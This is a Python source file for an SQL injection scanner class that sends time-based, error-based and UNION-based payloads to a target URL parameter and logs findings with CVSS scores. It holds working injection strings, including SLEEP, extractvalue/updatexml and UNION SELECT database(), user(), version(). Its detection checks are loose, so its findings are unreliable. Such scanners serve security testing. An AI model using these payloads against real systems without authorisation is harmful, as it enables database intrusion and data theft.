"""SQL Injection Scanner"""
import logging
import asyncio
import time
from scanners.base_scanner import BaseScanner

log = logging.getLogger("xone.scanners.sqli")


class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner"""

    @property
    def name(self) -> str:
        return "sqli_scanner"

    @property
    def description(self) -> str:
        return "SQL Injection: time-based blind, error-based, union-based"

    PAYLOADS = {
        "time_based": [
            "' AND SLEEP(5) --",
            "' AND BENCHMARK(10000000, MD5('a')) --",
            "' OR SLEEP(5) --",
            "\" AND SLEEP(5) --",
        ],
        "error_based": [
            "' AND extractvalue(1, concat(0x7e, (SELECT database()))) --",
            "' AND updatexml(1, concat(0x7e, (SELECT version())), 1) --",
            "' OR 1=1 --",
        ],
        "union_based": [
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL, NULL, NULL --",
            "1' UNION SELECT database(), user(), version() --",
        ]
    }

    async def scan(self, url: str, param: str, method: str = "get") -> list[Finding]:
        """
        Scan for SQL injection vulnerabilities

        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method (get/post)
        """
        self.findings = []

        log.info(f"[SQLi] Scanning: {url}?{param}=X")

        # Test 1: Time-based blind
        await self._test_time_based(url, param, method)

        # Test 2: Error-based
        await self._test_error_based(url, param, method)

        # Test 3: Union-based
        await self._test_union_based(url, param, method)

        return self.findings

    async def _test_time_based(self, url: str, param: str, method: str) -> None:
        """Test for time-based blind SQL injection"""
        test_payload = "' AND SLEEP(3) --"

        try:
            # Time normal request
            start = time.time()
            if method == "post":
                await self.client.post(url, data={param: "1"}, timeout=5)
            else:
                await self.client.get(f"{url}?{param}=1", timeout=5)
            normal_time = time.time() - start

            # Time payload request
            start = time.time()
            if method == "post":
                await self.client.post(url, data={param: test_payload}, timeout=8)
            else:
                await self.client.get(f"{url}?{param}={test_payload.replace(' ', '+')}", timeout=8)
            payload_time = time.time() - start

            # If payload is 3+ seconds slower, likely vulnerable
            if payload_time - normal_time >= 2.5:
                self.create_finding(
                    vuln_type="SQL Injection: Time-Based Blind",
                    url=url,
                    payload=test_payload,
                    severity="High",
                    param=param,
                    context="Server delays response when SQL sleep() executes",
                    cvss_score=7.5,
                    cvss_vector="AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                )
                log.info("[SQLi] Time-based blind found!")

        except asyncio.TimeoutError:
            # Timeout could indicate vulnerable (server sleeping)
            self.create_finding(
                vuln_type="SQL Injection: Time-Based Blind",
                url=url,
                payload=test_payload,
                severity="High",
                param=param,
                context="Request timed out (SLEEP payload executed)",
                cvss_score=7.5,
                cvss_vector="AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
            )
            log.info("[SQLi] Timeout detected on SQL payload")
        except Exception as e:
            log.debug(f"[SQLi] Time-based test error: {e}")

    async def _test_error_based(self, url: str, param: str, method: str) -> None:
        """Test for error-based SQL injection"""
        error_payload = "' OR 1=1 --"

        try:
            if method == "post":
                response = await self.client.post(url, data={param: error_payload})
            else:
                response = await self.client.get(f"{url}?{param}={error_payload.replace(' ', '+')}")

            # Check for SQL error messages
            error_indicators = [
                "SQL", "mysql", "syntax error", "column", "table not found",
                "sqlstate", "pdo", "database", "prepared statement"
            ]

            response_lower = response.text.lower()
            found_error = any(indicator in response_lower for indicator in error_indicators)

            if found_error:
                self.create_finding(
                    vuln_type="SQL Injection: Error-Based",
                    url=url,
                    payload=error_payload,
                    severity="High",
                    param=param,
                    context="SQL error message reflected in response",
                    cvss_score=8.0,
                    cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                )
                log.info("[SQLi] Error-based found!")

        except Exception as e:
            log.debug(f"[SQLi] Error-based test error: {e}")

    async def _test_union_based(self, url: str, param: str, method: str) -> None:
        """Test for UNION-based SQL injection"""
        test_payloads = [
            "1' UNION SELECT NULL --",
            "1' UNION SELECT NULL, NULL --",
            "1' UNION SELECT NULL, NULL, NULL --",
            "1' UNION SELECT NULL, NULL, NULL, NULL --",
        ]

        for payload in test_payloads:
            try:
                if method == "post":
                    response = await self.client.post(url, data={param: payload})
                else:
                    response = await self.client.get(f"{url}?{param}={payload.replace(' ', '+')}")

                # UNION-based usually succeeds without error
                if response.status_code == 200 and len(response.text) > 100:
                    # Could be vulnerable
                    self.create_finding(
                        vuln_type="SQL Injection: UNION-Based",
                        url=url,
                        payload=payload,
                        severity="Critical",
                        param=param,
                        context="UNION SELECT payload returned data",
                        cvss_score=9.8,
                        cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                    )
                    log.info(f"[SQLi] UNION-based found with {payload.count('NULL')} columns")
                    return

            except Exception as e:
                log.debug(f"[SQLi] UNION-based test error: {e}")
